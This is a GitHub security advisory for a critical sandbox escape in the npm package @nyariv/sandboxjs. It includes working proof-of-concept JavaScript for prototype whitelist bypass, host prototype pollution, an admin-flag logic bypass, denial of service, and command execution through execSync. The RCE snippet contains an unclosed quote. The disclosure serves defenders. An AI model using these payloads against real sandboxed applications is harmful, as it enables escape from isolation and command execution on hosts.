# [C] @nyariv/sandboxjs has Sandbox Escape via Prototype Whitelist Bypass and Host Prototype Pollution

## Summary
Severity: Critical
Advisory: GHSA-jjpw-65fv-8g48
CVE: CVE-2026-25586
CWE: CWE-74
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-05
Source: https://github.com/advisories/GHSA-jjpw-65fv-8g48
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.29

## Details
## Summary
A sandbox escape is possible by shadowing `hasOwnProperty` on a sandbox object, which disables prototype whitelist enforcement in the property-access path. This permits direct access to `__proto__` and other blocked prototype properties, enabling **host `Object.prototype` pollution** and persistent cross-sandbox impact.

The issue was reproducible on Node `v23.9.0` using the project’s current build output. The bypass works with default `Sandbox` configuration and does not require custom globals or whitelists.

## Root Cause
`prototypeAccess` uses `a.hasOwnProperty(b)` directly, which can be attacker‑controlled if the sandboxed object shadows `hasOwnProperty`. When this returns `true`, the whitelist checks are skipped.

- [src/executor.ts:348](https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L348)  `const prototypeAccess = isFunction || !(a.hasOwnProperty(b) || typeof b === 'number');`

<img width="1030" height="593" alt="image" src="https://github.com/user-attachments/assets/0fa0807e-81cc-45b5-be13-bd839c974a4f" />

- [src/executor.ts:367-399](https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L367) prototype whitelist enforcement only happens when `prototypeAccess` is true.

<img width="929" height="345" alt="image" src="https://github.com/user-attachments/assets/27cff24d-b892-4d56-9f59-1e5fd32ef471" />

- [src/executor.ts:220-233](https://github.com/nyariv/SandboxJS/blob/6103d7147c4666fe48cfda58a4d5f37005b43754/src/executor.ts#L220) mutation guard uses `obj.context.hasOwnProperty(...)`, also bypassable via shadowing.

<img width="769" height="332" alt="image" src="https://github.com/user-attachments/assets/52fbb962-6ff0-4607-90a8-79fc3a50c897" />


## Proofs of Concept
 `node node_modules/typescript/bin/tsc --project tsconfig.json --outDir build --declaration`
 `node node_modules/rollup/dist/bin/rollup -c`
 Runtime target: `dist/node/Sandbox.js`
 
 ### Baseline: `__proto__` blocked without bypass
```js
const Sandbox = require('./dist/node/Sandbox.js').default;
const sandbox = new Sandbox();
try {
  const res = sandbox.compile(`return ({}).__proto__`)().run();
  console.log('res', res);
} catch (e) {
  console.log('error', e && e.message);
}
```
<img width="734" height="65" alt="image" src="https://github.com/user-attachments/assets/bdbbbe8b-5667-46e4-b4b5-ff4693764ef9" />

### Prototype whitelist bypass -> host `Object.prototype` pollution
```js
const Sandbox = require('./dist/node/Sandbox.js').default;
const sandbox = new Sandbox();
const code = `
  const o = { hasOwnProperty: () => true };
  const proto = o.__proto__;
  proto.polluted = 'pwned';
  return 'done';
`;

sandbox.compile(code)().run();

console.log('polluted' in ({}), ({}).polluted);
```
<img width="549" height="95" alt="image" src="https://github.com/user-attachments/assets/83471777-ee8e-4140-b702-9a575335fd30" />


### Logic bypass via prototype pollution
```js
const Sandbox = require('./dist/node/Sandbox.js').default;
const sandbox = new Sandbox();

sandbox.compile(`
  const o = { hasOwnProperty: () => true };
  const proto = o.__proto__;
  proto.isAdmin = true;
  return 'ok';
`)().run();

console.log('isAdmin', ({}).isAdmin === true);
```
<img width="527" height="83" alt="image" src="https://github.com/user-attachments/assets/772bb111-d3e6-4f81-8142-80228e579b57" />

### DoS by overriding `Object.prototype.toString`
```js
const Sandbox = require('./dist/node/Sandbox.js').default;
const sandbox = new Sandbox();

sandbox.compile(`
  const o = { hasOwnProperty: () => true };
  const proto = o.__proto__;
  proto.toString = function () { throw new Error('aaaaaaa'); };
  return 'ok';
`)().run();

try {
  String({});
} catch (e) {
  console.log('error', e.message);
}
```
<img width="500" height="147" alt="image" src="https://github.com/user-attachments/assets/eb5bff1b-ebe7-470a-abe6-d836de85ad41" />

### RCE via host gadget (prototype pollution -> `execSync`)

<img width="737" height="143" alt="image" src="https://github.com/user-attachments/assets/952ba404-573f-4cb7-9b70-f3294ea19b40" />


```js
const Sandbox = require('./dist/node/Sandbox.js').default;
const { execSync } = require('child_process');

const sandbox = new Sandbox();

sandbox.compile(`
  const o = { hasOwnProperty: () => true };
  const proto = o.__proto__;
  proto.cmd = 'id;
  return 'ok';
`)().run();

const obj = {}; // typical innocent object
const out = execSync(obj.cmd, { encoding: 'utf8' }).trim();
console.log(out);
```


## Additional Finding : Prototype mutation via intermediate reference
This does **not** require the `hasOwnProperty` bypass. Some prototypes can be reached via allowed static access (`[].constructor.prototype`) and then mutated via a local variable, which bypasses `isGlobal` checks.
### Mutate `Array.prototype.filter` without bypass
```js
const Sandbox = require('./dist/node/Sandbox.js').default;
const sandbox = new Sandbox();

sandbox.compile(`const p = [].constructor.prototype; p.filter = 1; return 'ok';`)().run();

console.log('host filter', [1,2].filter);
```
**Output:**
```
host filter 1
```

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-jjpw-65fv-8g48
- https://nvd.nist.gov/vuln/detail/CVE-2026-25586
- https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3
- https://github.com/nyariv/SandboxJS
